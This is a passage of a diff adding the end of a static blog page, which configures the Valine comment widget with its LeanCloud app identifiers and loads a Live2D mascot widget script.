+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: false,
+      appId: 'FKw4jJEUpTDi55S57eziGl3U-MdYXbMMI',
+      appKey: 'bTO2AX9NF2izaM70VOYSuTlb',
+      placeholder: "欢迎交流讨论...",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: true,
+      lang: 'zh-cn' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
